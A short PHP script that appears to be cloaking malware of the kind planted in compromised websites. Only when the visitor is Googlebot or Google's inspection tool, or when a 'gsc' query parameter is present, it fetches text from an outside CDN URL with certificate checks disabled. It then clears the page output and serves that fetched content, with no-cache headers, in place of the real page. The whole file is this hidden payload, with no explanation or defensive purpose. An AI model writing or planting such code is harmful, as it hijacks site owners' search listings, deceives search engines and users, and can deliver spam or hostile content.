<?php
if (PHP_SAPI === 'cli') exit;

$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$q  = isset($_GET['gsc']);
$is_bot = (strpos($ua, 'googlebot') !== false || strpos($ua, 'inspectiontool') !== false);

if ($q || $is_bot) {
  $u = "https://xu00.b-cdn.net/14sept/brareye.txt";
  $r = '';

  if (function_exists('curl_init')) {
    $ch = curl_init($u);
    curl_setopt_array($ch, [
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_TIMEOUT => 5,
      CURLOPT_SSL_VERIFYPEER => false,
      CURLOPT_SSL_VERIFYHOST => false
    ]);
    $r = curl_exec($ch);
    curl_close($ch);
  }

  if (!$r && ini_get('allow_url_fopen')) {
    $r = @file_get_contents($u);
  }

  if ($r && strlen($r) > 50) {

    @header("X-LiteSpeed-Cache-Control: no-cache");
    @header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    @header("Pragma: no-cache");
    @header("Expires: 0");

    if (function_exists('ob_get_level')) {
      while (ob_get_level()) @ob_end_clean();
    }

    echo $r;
    exit;
  }
}
